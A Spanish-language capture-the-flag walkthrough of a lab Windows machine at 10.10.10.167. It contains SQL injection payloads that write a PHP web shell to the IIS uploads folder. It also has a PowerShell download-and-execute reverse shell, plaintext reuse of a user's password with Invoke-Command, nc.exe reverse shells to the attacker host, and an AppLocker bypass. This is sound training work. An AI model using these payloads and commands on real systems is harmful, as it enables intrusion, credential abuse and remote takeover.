## Vuln exploit & Gaining Access {-}

### Ganando accesso con SQL Injection {-}

Lo que vamos a intentar hacer, es escribir en un fichero usando la **SQLI**. Esto se puede hacer con el commando
`into outfile`. Como savemos que la web es un IIS la routa por defecto de windows para hostear las webs de IIS es
`C:\inetpub\wwwroot` y hemos encontrado una routa `/uploads` intentamos ver si podemos escribir nuevos ficheros.

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\test.txt-- -
[+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\test.txt-- -
```

Si vamos a la url `http://10.10.10.167/uploads/test.txt` vemos el fichero creado. Intentamos injectar codigo malicioso

```bash
rlwrap python3 sqli_injection.py
[+] Payload : ' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\s4vishell.php-- -
```

Ya podemos comprobar que podemos ejecutar comandos en la url `http://10.10.10.167/uploads/s4vishell.php?cmd=whoami`. 

Vamos a por ganar accesso al systema

1. Descargamos la nueva full TTY powershell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    stty size
    vi Invoke-ConPtyShell.ps1
    ```

1. Añadimos lo siguiente al final del fichero

    ```bash
    Invoke-ConPtyShell -RemoteIp 10.10.14.15 -RemotePort 443 -Rows 51 -Cols 189
    ```

1. Compartimos un servidor web con python

    ```bash`
    python3 -m http.server 80
    ``

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos y ejecutamos el ficher Invoke-ConPtyShell.ps1

    ```bash
    http://10.10.10.167/uploads/s4vishell.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString("http://10.10.14.15/Invoke-ConPtyShell.ps1")
    ```

Ya tenemos accesso al systema

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
-> enter
-> enter

whoami
#output
error

cd C:\
#output
error
```

Los dos primeros commandos nos da un error pero a partir de aqui, ya tenemos una full tty shell.

### Enumerando el systema {-}

```bash
cd Users/
dir
cd Hector
dir
#Output
Error

cd ../Administrator
dir
#Output
Error
```

No tenemos derechos para entrar en los directorios de los Usuarios. Pero tenemos una contraseña para el usuario Hector.

### User pivoting al usuario hector {-}

Vemos si podemos lanzar commandos como el usuario hector.

```bash
hostname
#Output
Fidelity

$user = 'fidelity\hector'
$password = 'l33th4x0rhector'
$secpw = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCrendential $user,$secpw
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
#Output
control\hector
```

Hemos podido lanzar un script enjaolado sobre un Blocke como si fuera el usuario hector que lo ejecutara.
La idea aqui es entablarnos una reverse shell ejecutada como el usuario hector.

1. Enviamos un nc.exe a la maquina victima

    - en la maquina de atacante

        ```bash
        locate nc.exe
        cp /usr/share/sqlninja/apps/nc.exe .
        impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
        ```

    - en la maquina victima

        ```bash
        cd C:\Windows\Temp
        mkdir userPivoting
        cd userPivoting
        net use x: \\10.10.14.15\smbFolder /user:s4vitar s4vitar123
        copy x:\nc.exe nc.exe
        ```

1. Lanzamos la reverse shell como el usuario hector

    - en la maquina de atacante

        ```bash
        rlwrap nc -nlvp 443
        ```

    - en la maquina victima

        ```bash
        Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock {C:\Windows\Temp\userPivoting\nc.exe -e cmd 10.10.14.15 443 }
        ```

        tenemos un error, quiere decir que tenemos que passar por un **AppLockerByPass**. Las routas se pueden encontrar en [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).

        ```bash
        cp nc.exe C:\Windows\System32\spool\drivers\color\nc.exe
        C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443
        ```

Ya hemos ganado acceso al systema como el usuario hector y podemos ver la flag.